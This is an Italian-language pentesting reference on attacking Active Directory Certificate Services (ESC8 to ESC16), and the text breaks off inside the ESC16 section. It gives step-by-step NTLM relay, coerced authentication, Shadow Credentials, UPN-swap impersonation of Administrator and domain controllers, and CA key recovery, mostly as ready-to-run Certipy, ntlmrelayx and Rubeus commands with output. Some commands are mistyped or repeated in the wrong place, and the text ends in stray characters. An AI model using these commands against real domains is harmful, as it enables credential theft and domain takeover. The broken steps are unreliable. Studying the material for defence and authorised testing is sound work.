AD CS supporta diversi **metodi di enrollment basati su HTTP**, resi disponibili tramite ruoli server aggiuntivi che gli amministratori possono installare. Queste interfacce per l’enrollment dei certificati tramite HTTP sono vulnerabili agli **attacchi NTLM relay**. Un attacker, da una **macchina compromessa, può impersonare qualsiasi account AD che esegue l’autenticazione tramite NTLM in ingresso**. Impersonando l’account della vittima, l’attacker può accedere a queste interfacce web per **richiedere un certificato di autenticazione client utilizzando i certificate template `User` o `Machine`**.

- L’**interfaccia web enrollment** (una vecchia applicazione ASP disponibile su `http://<caserver>/certsrv/`) utilizza HTTP per impostazione predefinita, senza protezione dagli attacchi NTLM relay. Inoltre, consente esplicitamente solo l’autenticazione NTLM tramite il suo header HTTP Authorization, rendendo inapplicabili metodi di autenticazione più sicuri come Kerberos.
- Il **Certificate Enrollment Service** (CES), il Web Service **Certificate Enrollment Policy** (CEP) e il **Network Device Enrollment Service** (NDES) supportano per impostazione predefinita l’autenticazione negotiate tramite il loro header HTTP Authorization. L’autenticazione negotiate **supporta sia** Kerberos sia **NTLM**, consentendo a un attacker di eseguire un **downgrade all’autenticazione NTLM** durante gli attacchi relay. Sebbene questi web service abilitino HTTPS per impostazione predefinita, HTTPS da solo **non protegge dagli attacchi NTLM relay**. La protezione dagli attacchi NTLM relay per i servizi HTTPS è possibile solo combinando HTTPS con il channel binding. Purtroppo, AD CS non attiva Extended Protection for Authentication su IIS, necessaria per il channel binding.<sup>[[6]](#references)</sup>

Un **problema** comune degli attacchi NTLM relay è la **breve durata delle sessioni NTLM** e l’impossibilità per l’attacker di interagire con servizi che **richiedono la firma NTLM**.

Tuttavia, è possibile superare questa limitazione sfruttando un attacco NTLM relay per ottenere un certificato per l’utente: la durata della sessione è infatti determinata dal periodo di validità del certificato, che può essere utilizzato con servizi che **richiedono la firma NTLM**. Per istruzioni su come utilizzare un certificato rubato, consulta:


{{#ref}}
account-persistence.md
{{#endref}}

Un’altra limitazione degli attacchi NTLM relay è che **un account della vittima deve autenticarsi verso una macchina controllata dall’attacker**. L’attacker può aspettare oppure tentare di **forzare** questa autenticazione:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

Il comando `cas` di [**Certify**](https://github.com/GhostPack/Certify) enumera gli **endpoint HTTP AD CS abilitati**:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La proprietà `msPKI-Enrollment-Servers` viene utilizzata dalle Autorità di certificazione (CA) aziendali per archiviare gli endpoint del Certificate Enrollment Service (CES). Questi endpoint possono essere analizzati ed elencati utilizzando lo strumento **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso con Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Abuso con [Certipy](https://github.com/ly4k/Certipy)

Per impostazione predefinita, Certipy effettua la richiesta di un certificato basandosi sul template `Machine` o `User`, determinato dal fatto che il nome dell'account sottoposto a relay termini o meno con `$`. È possibile specificare un template alternativo tramite il parametro `-template`.

È quindi possibile usare una tecnica come [PetitPotam](https://github.com/ly4k/PetitPotam) per forzare l'autenticazione. Per i domain controller, è necessario specificare `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## Nessuna Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Spiegazione

Il valore **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) di **`msPKI-Enrollment-Flag`**, denominato ESC9, omette l'estensione SID `szOID_NTDS_CA_SECURITY_EXT` da un certificato. I vecchi esempi di ESC9 dipendono dal comportamento di compatibilità del KDC (`StrongCertificateBindingEnforcement=1`) o da un percorso separato di mapping Schannel debole. Il valore `1` è un'**impostazione storica di compatibilità**, non il valore predefinito attuale: Microsoft dichiara che l'override del KDC ha cessato di essere supportato con l'aggiornamento di sicurezza di Windows del 9 settembre 2025. Prima di applicare una procedura meno recente, verifica l'aggiornamento effettivamente installato sul target e l'endpoint di autenticazione.<sup>[[7]](#references)</sup> Consulta le [indicazioni di Microsoft sul rilascio](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Le condizioni in cui l'impostazione di questo flag diventa rilevante includono:

- Su un KDC compatibile meno recente, la policy effettiva di certificate binding consente il mapping; in alternativa, l'endpoint Schannel abilita separatamente il mapping UPN tramite il bit `0x4` di `CertificateMappingMethods`.
- Il certificato è contrassegnato con il flag `CT_FLAG_NO_SECURITY_EXTENSION` nell'impostazione `msPKI-Enrollment-Flag`.
- Il certificato specifica un EKU di autenticazione client.
- Sono disponibili autorizzazioni `GenericWrite` su un account per comprometterne un altro.

### Scenario di abuso

Supponiamo che `John@corp.local` disponga di autorizzazioni `GenericWrite` su `Jane@corp.local` e che l'obiettivo sia compromettere `Administrator@corp.local`. Il template di certificato `ESC9`, a cui `Jane@corp.local` è autorizzata ad iscriversi, è configurato con il flag `CT_FLAG_NO_SECURITY_EXTENSION` nell'impostazione `msPKI-Enrollment-Flag`.

Inizialmente, si ottiene l'hash di `Jane` tramite Shadow Credentials, grazie alle autorizzazioni `GenericWrite` di `John`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Successivamente, il `userPrincipalName` di `Jane` viene modificato in `Administrator`, omettendo intenzionalmente la parte del dominio `@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Questa modifica non viola i vincoli, dato che `Administrator@corp.local` rimane distinto dal `userPrincipalName` di `Administrator`.

Successivamente, il certificate template `ESC9`, contrassegnato come vulnerabile, viene richiesto come `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Si nota che il `userPrincipalName` del certificato riflette `Administrator`, senza alcun «object SID».

Il `userPrincipalName` di `Jane` viene quindi ripristinato al valore originale, `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Il tentativo di autenticazione con il certificato rilasciato restituisce ora l’hash NT di `Administrator@corp.local`. Il comando deve includere `-domain <domain>` perché il certificato non specifica il dominio:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Mapping dei certificati deboli - ESC10

### Spiegazione

Nell'ambito di ESC10 si discutono spesso due criteri distinti di mapping dei certificati. Leggi l'impostazione sull'endpoint che gestisce effettivamente l'autenticazione pertinente:

- Schannel `CertificateMappingMethods` in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` controlla il mapping dei certificati client TLS sul server applicativo. Il bit UPN è `0x4`; il valore predefinito è `0x18` (`0x8 | 0x10`) sui sistemi aggiornati.
- KDC `StrongCertificateBindingEnforcement` in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` controllava storicamente la compatibilità del binding dei certificati Kerberos. Il valore `1` non è un valore predefinito attuale affidabile e Microsoft ha terminato il supporto per questo override con l'aggiornamento di sicurezza di Windows del 9 settembre 2025. Il suo stato non descrive di per sé il mapping UPN di Schannel.<sup>[[7]](#references)</sup>

**Caso 1**

Storicamente, quando un KDC meno recente rispettava `StrongCertificateBindingEnforcement=0`; verifica il livello di aggiornamento, perché l'override non è più supportato sui sistemi aggiornati attuali.

**Caso 2**

Quando sull'endpoint Schannel per i certificati client è abilitato il bit UPN (`0x4`) di `CertificateMappingMethods`. Questa è un'impostazione distinta dall'applicazione del binding forte del KDC e richiede comunque un certificato di autenticazione client a cui sia possibile effettuare l'enrollment, oltre a un controllo effettivo dell'attributo dell'account usato per il mapping.

### Caso di abuso 1

In una distribuzione meno recente in cui il KDC rispetta ancora `StrongCertificateBindingEnforcement=0`, il controllo di `userPrincipalName` di un account può costituire parte di un percorso di mapping debole verso un altro account. L'enrollment del certificato richiesto, il mapping, l'identità di destinazione e l'autenticazione riuscita devono essere verificati separatamente; una ACE `GenericWrite` o un valore del registro, da soli, non dimostrano che l'account possa essere compromesso.

Per esempio, disponendo di permessi `GenericWrite` su `Jane@corp.local`, un attacker mira a compromettere `Administrator@corp.local`. La procedura ricalca ESC9 e consente di utilizzare qualsiasi template di certificato.

Inizialmente, l'hash di `Jane` viene recuperato utilizzando Shadow Credentials, sfruttando `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Successivamente, il `userPrincipalName` di `Jane` viene modificato in `Administrator`, omettendo deliberatamente la parte `@corp.local` per evitare una violazione dei vincoli.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

A seguito di ciò, viene richiesto un certificato che consente l'autenticazione client come `Jane`, usando il template predefinito `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

Il `userPrincipalName` di `Jane` viene quindi ripristinato al suo valore originale, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

L'autenticazione con il certificato ottenuto restituirà l'hash NT di `Administrator@corp.local`; sarà quindi necessario specificare il dominio nel comando, poiché il certificato non contiene informazioni sul dominio.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Caso di abuso 2

Con `CertificateMappingMethods` contenente il flag di bit `UPN` (`0x4`), un account A con permessi `GenericWrite` può compromettere qualsiasi account B privo della proprietà `userPrincipalName`, inclusi gli account macchina e l’amministratore di dominio integrato `Administrator`.

In questo caso, l’obiettivo è compromettere `DC$@corp.local`, iniziando con l’ottenimento dell’hash di `Jane` tramite Shadow Credentials, sfruttando `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

Il `userPrincipalName` di `Jane` viene quindi impostato su `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Viene richiesto un certificato per l'autenticazione client come `Jane` usando il template predefinito `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

Il `userPrincipalName` di `Jane` viene ripristinato al valore originale dopo questo processo.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Per autenticarsi tramite Schannel, viene utilizzata l’opzione `-ldap-shell` di Certipy, che indica l’autenticazione riuscita come `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Tramite la shell LDAP, comandi come `set_rbcd` consentono attacchi di Resource-Based Constrained Delegation (RBCD), compromettendo potenzialmente il controller di dominio.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Questa vulnerabilità si estende anche a qualsiasi account utente privo di `userPrincipalName` o il cui valore non corrisponde a `sAMAccountName`. L'account predefinito `Administrator@corp.local` è un bersaglio ideale, perché dispone di privilegi LDAP elevati e, per impostazione predefinita, non ha un `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Spiegazione

Se il CA Server non è configurato con `IF_ENFORCEENCRYPTICERTREQUEST`, è possibile eseguire attacchi NTLM relay senza firma tramite il servizio RPC. [Riferimento qui](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Puoi usare `certipy` per verificare se `Enforce Encryption for Requests` è disabilitato; in tal caso, certipy segnalerà le vulnerabilità `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Scenario di abuso

È necessario configurare un server relay:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Nota: per i controller di dominio, dobbiamo specificare `-template` in DomainController.

Oppure usando [il fork di impacket di sploutchy](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Shell access a una CA ADCS con YubiHSM - ESC12

### Spiegazione

Gli amministratori possono configurare la Certificate Authority in modo che venga archiviata su un dispositivo esterno, come "Yubico YubiHSM2".

Se un dispositivo USB è collegato al server CA tramite una porta USB, o a un USB device server nel caso in cui il server CA sia una macchina virtuale, è necessaria una chiave di autenticazione (a volte chiamata "password") affinché il Key Storage Provider possa generare e utilizzare le chiavi nello YubiHSM.

Questa chiave/password è archiviata in testo in chiaro nel registro, alla voce `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Riferimento disponibile [qui](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scenario di abuso

Se la chiave privata della CA è archiviata su un dispositivo USB fisico quando ottieni l'accesso shell, è possibile recuperarla.

Per prima cosa, devi ottenere il certificato della CA (che è pubblico), quindi:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Infine, usa il comando `certutil -sign` per contraffare un nuovo certificato arbitrario usando il certificato della CA e la sua chiave privata.

## OID Group Link Abuse - ESC13

### Spiegazione

L'attributo `msPKI-Certificate-Policy` consente di aggiungere la policy di emissione al template del certificato. Gli oggetti `msPKI-Enterprise-Oid`, responsabili delle policy di emissione, possono essere individuati nel Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) del contenitore PKI OID. Una policy può essere collegata a un gruppo AD tramite l'attributo `msDS-OIDToGroupLink` di questo oggetto, consentendo a un sistema di autorizzare un utente che presenta il certificato come se fosse membro del gruppo. [Riferimento](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

In altre parole, quando un utente ha l'autorizzazione per iscriversi a un certificato e il certificato è collegato a un gruppo OID, l'utente può ereditare i privilegi di questo gruppo.

Usa [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) per trovare OIDToGroupLink:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Scenario di abuso

Individua un'autorizzazione utente che può essere usata con `certipy find` o `Certify.exe find /showAllPermissions`.

Se `John` dispone dell'autorizzazione per eseguire l'enroll in `VulnerableTemplate`, l'utente può ereditare i privilegi del gruppo `VulnerableGroup`.

Deve solo specificare il template: otterrà un certificato con i diritti `OIDToGroupLink`.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Abuso del mapping esplicito dei certificati — ESC14

### Spiegazione

La descrizione disponibile all’indirizzo https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping è notevolmente approfondita. Di seguito è riportata una citazione del testo originale.<sup>[[14]](#references)</sup>

ESC14 riguarda le vulnerabilità derivanti da un «mapping esplicito debole dei certificati», principalmente dovute all’uso improprio o alla configurazione non sicura dell’attributo `altSecurityIdentities` sugli account utente o computer di Active Directory. Questo attributo multivalore consente agli amministratori di associare manualmente certificati X.509 a un account AD per l’autenticazione. Quando vengono configurati, questi mapping espliciti possono sostituire la logica predefinita di mapping dei certificati, che in genere si basa sugli UPN o sui nomi DNS nel SAN del certificato, oppure sul SID incorporato nell’estensione di sicurezza `szOID_NTDS_CA_SECURITY_EXT`.

Un mapping «debole» si verifica quando il valore stringa usato nell’attributo `altSecurityIdentities` per identificare un certificato è troppo generico, facilmente intuibile, si basa su campi del certificato non univoci o usa componenti del certificato facilmente falsificabili. Se un attaccante riesce a ottenere o creare un certificato i cui attributi corrispondono a un mapping esplicito debole definito per un account privilegiato, può usare quel certificato per autenticarsi come tale account e impersonarlo.

Esempi di stringhe di mapping `altSecurityIdentities` potenzialmente deboli includono:

- Mapping basato soltanto su un Common Name (CN) comune nel Subject: ad esempio, `X509:<S>CN=SomeUser`. Un attaccante potrebbe riuscire a ottenere un certificato con questo CN da una fonte meno sicura.
- Uso di Distinguished Name (DN) dell’emittente o del Subject troppo generici, senza ulteriori qualificatori, come un numero di serie specifico o un subject key identifier: ad esempio, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Uso di altri schemi prevedibili o identificatori non crittografici che un attaccante potrebbe riprodurre in un certificato che può ottenere legittimamente o falsificare (se ha compromesso una CA o ha trovato un template vulnerabile, come in ESC1).

L’attributo `altSecurityIdentities` supporta diversi formati di mapping, tra cui:

- `X509:<I>IssuerDN<S>SubjectDN` (mapping basato sul DN completo dell’emittente e del Subject)
- `X509:<SKI>SubjectKeyIdentifier` (mapping basato sul valore dell’estensione Subject Key Identifier del certificato)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapping basato sul numero di serie, implicitamente qualificato dal DN dell’emittente) - non è un formato standard; di solito è `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapping basato su un nome RFC822, in genere un indirizzo e-mail, presente nel SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapping basato su un hash SHA1 della chiave pubblica grezza del certificato - in genere è robusto)

La sicurezza di questi mapping dipende dagli identificatori utilizzati. Microsoft classifica come **deboli** i mapping basati su e-mail o nomi del Subject, incluso `X509:<RFC822>`. In modalità Full Enforcement, un certificato privo di un mapping robusto viene rifiutato; l’aggiornamento di sicurezza Windows di settembre 2025 ha rimosso l’opzione per tornare alla modalità Compatibility. Pertanto, un mapping debole da solo non costituisce un metodo affidabile per l’impersonificazione nell’ambiente attuale. Prima di valutare uno scenario basato su un mapping debole, verifica il livello di aggiornamento effettivo del domain controller e il comportamento del mapping dei certificati. L’accesso in scrittura a `altSecurityIdentities` è un indizio distinto: un attaccante con un certificato attendibile appropriato potrebbe riuscire ad aggiungere un mapping esplicito **robusto**, in base alle autorizzazioni effettive e alla convalida del certificato. Vedi [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) e [la ricerca su ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

È inoltre necessario diagnosticare gli errori di autenticazione tramite certificato: un account di destinazione disabilitato o una password scaduta possono impedire l’accesso anche se il certificato è ancora valido.

### Scenario di abuso

ESC14 prende di mira i **mapping espliciti dei certificati** in Active Directory (AD), in particolare l’attributo `altSecurityIdentities`. Se questo attributo è configurato (intenzionalmente o per errore), gli attaccanti possono impersonare gli account presentando certificati che corrispondono al mapping.

#### Scenario A: l’attaccante può scrivere in `altSecurityIdentities`

 **Prerequisito**: l’attaccante dispone di autorizzazioni di scrittura sull’attributo `altSecurityIdentities` dell’account di destinazione, oppure dell’autorizzazione per concederle sotto forma di una delle seguenti autorizzazioni sull’oggetto AD di destinazione:  
- Write property `altSecurityIdentities`  
- Write property `Public-Information`  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Scenario B: la destinazione ha un mapping debole X509RFC822 (e-mail)

- **Prerequisito storico/condizionale**: la destinazione ha un mapping X509RFC822 debole in `altSecurityIdentities`, l’attaccante può modificare l’attributo `mail` di un richiedente e un template idoneo include quell’indirizzo e-mail in un certificato di autenticazione client senza un binding SID in conflitto. L’autenticazione richiede inoltre un ambiente che accetti ancora il mapping debole; Full Enforcement rifiuta i mapping di certificati basati solo su mapping deboli. Il solo fatto che l’attributo `mail` sia scrivibile costituisce soltanto un indizio.
#### Scenario C: la destinazione ha un mapping X509IssuerSubject

- **Prerequisito**: la destinazione ha un mapping esplicito X509IssuerSubject debole in `altSecurityIdentities`. L’attaccante può impostare l’attributo `cn` o `dNSHostName` di un principal vittima in modo che corrisponda al Subject del mapping X509IssuerSubject della destinazione. L’attaccante può quindi richiedere un certificato come vittima e usarlo per autenticarsi come destinazione.
#### Scenario D: la destinazione ha un mapping X509SubjectOnly

- **Prerequisito**: la destinazione ha un mapping esplicito X509SubjectOnly debole in `altSecurityIdentities`. L’attaccante può impostare l’attributo `cn` o `dNSHostName` di un principal vittima in modo che corrisponda al Subject del mapping X509SubjectOnly della destinazione. L’attaccante può quindi richiedere un certificato come vittima e usarlo per autenticarsi come destinazione.
### operazioni concrete
#### Scenario A

Richiedi un certificato usando il template di certificato `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Salvare e convertire il certificato

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Autenticarsi (usando il certificato)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Pulizia (opzionale)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Per metodi di attacco più specifici nei vari scenari di attacco, consulta: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Spiegazione

La [ricerca originale su ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) spiega come le policy applicative fornite in una richiesta per un template V1 possano sovrascrivere l'Extended Key Usage configurato su una **CA di emissione non aggiornata**.<sup>[[15]](#references)</sup> È inoltre necessario un template candidato pubblicato e abilitato all'enrollment, che consenta le proprietà richieste per subject/request e non abbia procedure di approvazione o requisiti di firma che blocchino l'operazione. I soli diritti di enrollment non dimostrano che l'exploit sia possibile. L'uso di Certificate Request Agent può inoltre dipendere da un secondo template idoneo e dalle restrizioni degli enrollment agent; verifica lo stato delle patch della CA e il risultato dell'emissione prima di affermare che questo percorso è praticabile.

### Abuso

La [documentazione di Certipy sull'escalation dei privilegi](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) contiene esempi d'uso più dettagliati.<sup>[[14]](#references)</sup>


Il comando `find` di Certipy può aiutare a identificare i template V1 potenzialmente vulnerabili a ESC15 se la CA non è aggiornata.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Scenario A: Impersonificazione diretta tramite Schannel

**Passaggio 1: Richiedere un certificato, inserendo la policy applicativa "Client Authentication" e l'UPN del target.** L'attaccante `attacker@corp.local` prende di mira `administrator@corp.local` usando il template V1 "WebServer" (che consente al richiedente di specificare il subject).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Il template V1 vulnerabile con "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Inserisce l’OID `1.3.6.1.5.5.7.3.2` nell’estensione Application Policies del CSR.
- `-upn 'administrator@corp.local'`: Imposta il UPN nel SAN per l’impersonificazione.

**Passaggio 2: Autenticarsi tramite Schannel (LDAPS) usando il certificato ottenuto.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Scenario B: Impersonificazione PKINIT/Kerberos tramite abuso di Enrollment Agent

**Passaggio 1: Richiedere un certificato da un template V1 (con "Enrollee supplies subject"), iniettando l'Application Policy "Certificate Request Agent".** Questo certificato serve all'attacker (`attacker@corp.local`) per diventare un agente di registrazione. Qui non viene specificato alcun UPN per l'identità dell'attacker, poiché l'obiettivo è ottenere le funzionalità dell'agente.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Step 2: Usa il certificato "agent" per richiedere un certificato per conto di un utente privilegiato target.** Questo passaggio è simile a ESC3 e usa il certificato del Passaggio 1 come certificato agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Step 3: Autenticati come utente privilegiato utilizzando il certificato "on-behalf-of".**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Estensione di sicurezza disabilitata sulla CA (a livello globale)-ESC16

### Spiegazione

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** descrive la soppressione a livello di CA dell’estensione SID **szOID_NTDS_CA_SECURITY_EXT**. Si tratta di un indicatore di configurazione, non della prova che un certificato possa autenticarsi come un altro account. L’impersonificazione richiede anche il controllo degli attributi o del mapping dell’account pertinente, un template di autenticazione client a cui è possibile effettuare l’enrollment e un percorso di mapping del certificato accettato dal controller di dominio o dal servizio effettivo. Un KDC aggiornato in modalità Full Enforcement rifiuta i certificati privi di un’estensione SID, a meno che non dispongano di un altro mapping forte; la procedura Kerberos basata solo su UPN riportata di seguito si applica ai KDC meno recenti o in modalità di compatibilità che accettano ancora un mapping debole. Consulta le [indicazioni di Microsoft sul mapping dei certificati e sull’applicazione dei criteri](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Puoi anche consultare questo articolo per approfondire il principio: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuso

Il seguente esempio storico di Kerberos basato solo su UPN si basa sulla [documentazione di Certipy su ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Richiede un KDC che accetti ancora il mapping debole risultante; `StrongCertificateBindingEnforcement=1` non è più un’opzione supportata dopo l’aggiornamento di sicurezza di Windows del 9 settembre 2025.<sup>[[14]](#references)</sup>

Per identificare se l’ambiente Active Directory Certificate Services (AD CS) è vulnerabile a **ESC16**、】【

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

